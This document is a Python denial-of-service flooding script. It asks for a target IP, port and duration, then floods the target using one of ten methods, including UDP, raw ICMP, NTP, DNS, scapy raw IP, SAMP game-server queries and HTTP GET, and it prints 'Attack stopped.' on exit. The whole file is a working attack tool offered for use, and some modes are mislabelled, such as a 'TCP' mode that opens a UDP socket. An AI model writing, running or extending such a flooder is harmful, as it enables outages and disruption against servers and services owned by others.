import socket
import struct
import random
import requests
from scapy.all import IP, UDP, send, Raw
from time import time as tt

print("""
Method :
UDP, TCP, ICMP, NTP, DNS, RAW, SLOW, CC, SAMP, HTTPGET.
""")
method = str(input("Method : "))

def UDP():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    data = random._urandom(666)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        s.sendto(data, addr)

def TCP():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    data = random._urandom(666)
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        s.connect(addr)
        s.send(data)

def ICMP():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        for i in range(5):
            payload = bytes(random.sample(range(256), 20))
            icmp_type = 8
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = port
            icmp_seq = i+1
            icmp_data = payload
            icmp_packet = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + icmp_data
            checksum = 0

            for j in range(0, len(icmp_packet), 2):
                checksum += (icmp_packet[j] << 8) + icmp_packet[j+1]

            checksum = (checksum >> 16) + (checksum & 0xffff)
            icmp_checksum = ~checksum & 0xffff
            icmp_packet = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + icmp_data

            s.sendto(icmp_packet, (ip, port))

def NTP():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    packet = bytearray(56556)
    packet[0] = 0x1B
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        client.sendto(packet, addr)

def DNS():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    data = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01'
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        s.sendto(data, addr)

def RAW():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    payload = b"\x00" * 5000
    packet = IP(dst=ip) / Raw(load=payload)
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break
        
        for i in range(5):
            send(packet)
            i+1

def SLOW():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    payload = b"\x00" * 80
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        for i in range(2):
            s.sendto(payload, addr)
            i+1

def CC():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip),int(port))
    payload = b"\x0A\x0A" * 1500
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        s.sendto(payload, addr)

def SAMP():
    ip = str(input("IP : "))
    port = int(input("Port : "))
    time = int(input("Time : "))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    samp_request = "SAMP".encode()
    samp_request += b"\xFE\xED\xFA\xCE"
    samp_request += b"\x00"
    samp_request += b"MYNAME\0"
    samp_request += b"MYPASS\0"
    samp_request += b"MYKEY\0"
    sock.connect((ip, port))
    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.send(samp_request)

def HTTPGET():
    url = str(input("URL : "))
    time = int(input("Time : "))

    startup = tt()
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break

        for i in range(50):
            requests.get(url)
            i+1
    
if __name__ == '__main__':
    try:
       if method == 'UDP':
           UDP()
       elif method == 'TCP':
           TCP()
       elif method == 'ICMP':
           ICMP()
       elif method == 'NTP':
           NTP()
       elif method == 'DNS':
           DNS()
       elif method == 'RAW':
           RAW()
       elif method == 'CC':
           CC()
       elif method == 'SAMP':
           SAMP()
       elif method == 'HTTPGET':
           HTTPGET()
       elif method == 'SLOW':
           SLOW()
       else:
           print("Unknow method: %s" % method)
    except KeyboardInterrupt:
        print("\033[32mAttack stopped.")